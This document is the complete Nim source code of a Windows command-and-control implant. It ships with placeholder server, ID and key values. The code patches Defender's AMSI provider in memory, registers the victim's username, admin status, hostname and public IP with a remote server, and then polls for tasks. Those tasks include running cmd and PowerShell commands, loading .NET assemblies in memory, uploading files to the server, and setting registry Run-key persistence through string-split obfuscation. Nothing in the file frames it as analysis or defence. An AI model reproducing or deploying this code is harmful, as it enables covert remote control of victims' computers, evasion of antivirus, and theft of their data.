import std/[httpclient, json]
import strutils
import typetraits
import osproc
import strformat
import os
import winim
import nativesockets
import system
import net
import winim/lean
import winim/inc/lm
import sequtils
import strenc
import winim/clr
import winim/com
import shlex
import byteutils
import sugar
import terminaltables
from times import format
import RC4
import registry




let client = newHttpClient(userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3")
var id: string = "ID" 
var url: string = "http://" & "URL"
var identifier = "AUTH_KEY" 
var encKey = "RCKEY"


when defined amd64: 
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsi(): int =
    var
        amsi: HMODULE
        cs: pointer
        op: DWORD
        t: DWORD


    let filesInPath = toSeq(walkDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\", relative=true))
    var length = len(filesInPath)
    
    amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
    if amsi == 0:
        return 1

    cs = GetProcAddress(amsi, "DllGetClassObject")
    if cs == nil:  
        return 1

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        return 0
    
    
proc register() =
    var buffer = newString(UNLEN + 1)
    var cb = DWORD buffer.len
    GetUserNameA(&buffer, &cb)
    buffer.setLen(cb - 1) 

    
    var adminstat: string = ""
    if os.isAdmin() == false:
        adminstat = "0"
    else:
        adminstat = "1"

    var hostname = getHostname()

    const source = "http://ipv4.icanhazip.com" 

    var amsistate = PatchAmsi()

    
    let response = client.getContent(source)
    var resultIP = response.strip()
    client.headers = newHttpHeaders({ 
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3"
        })
    let body = %*{
        toRC4(encKey,"id"): toRC4(encKey,id),
        toRC4(encKey,"authKey"): toRC4(encKey,identifier),
        toRC4(encKey,"username"): toRC4(encKey,buffer),
        toRC4(encKey,"isAdmin"): toRC4(encKey,adminstat),
        toRC4(encKey,"os"): toRC4(encKey,hostOS),
        toRC4(encKey,"hostname"): toRC4(encKey,hostName), 
        toRC4(encKey,"publicIP"): toRC4(encKey,resultIP), 
        toRC4(encKey,"amsi"): toRC4(encKey,$amsistate)


    }
    try:
        let response = client.request(fmt"{url}/reg", httpMethod = HttpPost, body = $body)
        echo response.status
    finally:
        client.close()


proc sendResult(input: string) =

    
    client.headers = newHttpHeaders({ 
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3"
        })
    let body = %*{
        toRC4(encKey,"id"): toRC4(encKey,id),
        toRC4(encKey,"data"): toRC4(encKey,input)

    }
    try:
        
        let response = client.request(fmt"{url}/result", httpMethod = HttpPost, body = $body)
        echo response.status
    finally:
        client.close()

proc uploadFile(path: string) =
    try:
        var filecontent = readFile(path)
        var filename = path.split("\\")[^1]


        client.headers = newHttpHeaders({ 
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
            "X-Upload": "true"
            })
        let body = %*{
            toRC4(encKey,"id"): toRC4(encKey,id),
            toRC4(encKey,"data"): toRC4(encKey,fileContent),
            toRC4(encKey,"filename"): toRC4(encKey,filename)
        }

        try:
            let response = client.request(fmt"{url}/result", httpMethod = HttpPost, body = $body)
            echo response.status
        finally:
            client.close()
    except:
        var errmsg: string = "[-] Error uploading file, check syntax and file if file exists!"
        sendResult(errmsg & "\n")

proc getTask(): (string, string) =
    let source = fmt"{url}/tasks/" & id

    client.headers = newHttpHeaders({ 
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3"
        })
    let response = client.getContent(source)
    var result = response.strip()


    let jsonNode = parseJson(result)
    try:
        echo jsonNode[0]
    except:
        return ("[]", "[]")


    var cmd = jsonNode[0].getStr()
    cmd = fromRC4(encKey,cmd)
    var additionalData = if jsonNode.len > 1: jsonNode[1].getStr() else: ""
    additionalData = fromRC4(encKey,additionalData)

    
    return (cmd, additionalData)

proc getAv*() : string =
    let wmisec = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2")
    for avprod in wmisec.execQuery("SELECT displayName FROM AntiVirusProduct\n"):
        result.add($avprod.displayName & "\n")
    result = result.strip(trailing = true)


register()
var sleepVar: int = 5000
while true:
    try:
        sleep(sleepVar)
        let (MainTask, SecondaryTask) = getTask()

        
        
        if MainTask.split(" ")[0] == "sleep":
            var taskArgs = MainTask.split(" ")[1 .. ^1]
            var taskStr = taskArgs.join(" ")
            var res: string = "Callback interval changed to: " & taskStr
            #echo res
            sendResult(res)
            sleepVar = parseInt(taskStr)

        elif MainTask == "[]":
            echo fmt"No task - Sleeping for {sleepVar} seconds"
        
        elif MainTask == "exit":
            echo "Exiting"
            quit(1)
        
        elif MainTask == "GetAV":
            var result = getAv()
            sendResult(result)
        
        elif MainTask.split(" ")[0] == "execute-ASM":
            var params: string = "" 
            var paramsList = MainTask.split(" ")[2 .. ^1]
            params = paramsList.join(" ")
            var payloadStr = SecondaryTask

            let payloadParts=payloadStr.split(",")
            var buf:seq[byte] 


            var AMSIres = PatchAmsi()
            var state = ""
            if AMSIres == 0:
                state = "[+] AMSI patched!\n"
            if AMSIres == 1:
                state = "[-] Error patching AMSI!\n"
            if AMSIres == 2:
                state = "[+] AMSI already patched!\n"
            
            for i in payloadParts:
                buf.add(hexToSeqByte(i))
        
            
            var assembly = load(buf)

            
            dump assembly
            var arr = toCLRVariant(shlex(params).words, VT_BSTR) 

            let
                mscor = load("mscorlib")
                io = load("System.IO")
                Console = mscor.GetType("System.Console")
                StringWriter = io.GetType("System.IO.StringWriter")
            
                
            var sw = @StringWriter.new()
            var oldConsOut = @Console.Out
            @Console.SetOut(sw)

            assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

            var res = fromCLRVariant[string](sw.ToString())
            sendResult(fmt"{state}{res}")
            
            @Console.SetOut(oldConsOut)
        
        elif MainTask.split(" ")[0] == "pwsh":
            var params: string = "" 
            var paramsList = MainTask.split(" ")[1 .. ^1]
            params = paramsList.join(" ")
            



            var res = PatchAmsi()
            var state = ""
            if res == 0:
                state = "[+] AMSI patched!\n"
            if res == 1:
                state = "[-] Error patching AMSI!\n"
            if res == 2:
                state = "[+] AMSI already patched!\n"


            var ress = ""
            var Automation = load("System.Management.Automation")
            var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")

            var runspace = @RunspaceFactory.CreateRunspace()

            runspace.Open()

            try:
                var pipeline = runspace.CreatePipeline()
                pipeline.Commands.AddScript(params)
                pipeline.Commands.Add("Out-String")

                var results = pipeline.Invoke()

                for i in countUp(0,results.Count()-1):  
                    ress.add($results.Item(i))
                    sendResult(fmt"{state}{ress}")
            except:
                sendResult("[-] Error executing PowerShell command!\n")
            finally:
                runspace.Close()

        elif MainTask.split(" ")[0] == "ls":
            var args = MainTask.split(" ")[1 .. ^1]  
            var argString = args.join(" ")
            var path : string = argString
            if path == "":
                path = getCurrentDir()
            else:
                path = path

            var dateTimeFormat : string = "dd-MM-yyyy H:mm:ss"

            let t2 = newUnicodeTable()
            t2.separateRows = false
            t2.setHeaders(@[newCell("Name", pad=5), newCell("Size", rightpad=10), newCell("Last Modified", pad=2)])

            for kind, path in walkDir(path):
                case kind:
                of pcFile:
                    var fileName: string = "" 
                    var namelist = path.split("\\")
                    fileName = namelist.join(" ")
                    var size = getFileSize(path)
                    var lastaccess = getLastModificationTime(path)


                    for fileIndex in namelist:
                        if fileIndex == namelist[^1]:
                            #echo fileIndex
                            t2.addRow(@["--F-- "&fileIndex, $size, $lastaccess.format(dateTimeFormat)])
                of pcDir:
                    var dirlist = path.split("\\")
                    var lastaccess = getLastModificationTime(path)

                    for fileIndex in dirlist:
                        if fileIndex == dirlist[^1]:
                            #echo fileIndex
                            t2.addRow(@["--D-- "&fileIndex, "N/A", $lastaccess.format(dateTimeFormat)])
                of pcLinkToFile:
                    echo "Link to file: ", path
                of pcLinkToDir:
                    echo "Link to dir: ", path
            var OKmsg = fmt"[+] Listing directory: {path}"
            sendResult(OKmsg&"\n" & render(t2) & "\n")
        
        elif MainTask.split(" ")[0] == "cd":
            var args = MainTask.split(" ")[1 .. ^1]  
            var argString = args.join(" ")
            var dir : string = argString
            if dir == "":
                var errmsg: string = "[-] Invalid argument, please supply at least one directory..."
                sendResult(errmsg & "\n")
            else:
                setCurrentDir(dir)
                var OKmsg: string = fmt"[+] Changed working directory to: {dir}"
                sendResult(OKmsg & "\n")
        
        elif MainTask.split(" ")[0] == "pwd":
            var currentDIR = getCurrentDir()
            var OKmsgDIR: string = fmt"[+] Current working directory: {currentDIR}"
            sendResult(OKmsgDIR & "\n")

        elif MainTask.split(" ")[0] == "shell":
            var command = MainTask.split(" ")[1 .. ^1]
            var commandString = command.join(" ")
            var result = execProcess("cm" & "d /c " & commandString,options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
            sendResult(result)
        
        elif MainTask.split(" ")[0] == "persist":
            var
                regPath : string
                handle : registry.HKEY
                regname_str : string
                binname_str : string
                path : string

            var regname = MainTask.split(" ")[1]
            regname_str = regname.join(" ")
            var binname = MainTask.split(" ")[2 .. ^1]
            binname_str = binname.join(" ")
            
            path = encrypt("HK"&"CU\\S"&"oftwa"&"re\\Mi"&"cro"&"sof"&"t\\Windo"&"ws\\Curr"&"entVers"&"ion\\R"&"un")

            regPath = path.split("\\", 1)[1]
            handle = registry.HKEY_CURRENT_USER
            setUnicodeValue(regPath, regname_str, binname_str, handle)  

            sendResult(fmt"[+] Registry persistence set! in {path} with name {regname_str} and value {binname_str}\n")
        
        elif MainTask.split(" ")[0] == "download":
            var command = MainTask.split(" ")[1 .. ^1]
            var commandString = command.join(" ")
            var file : string = commandString
            uploadFile(file)
        

        else:
            while MainTask != "[]":
                if MainTask == "[]":
                    break
                else:
                    sendResult("[-] Invalid command: " & MainTask & "\n")
                    break
    except:
        var errmsg: string = "[-] Unexcpeted error occured!, cant reach server, trying to register again in 5 seconds..."
        echo errmsg
        sleep(5000)
        #register()




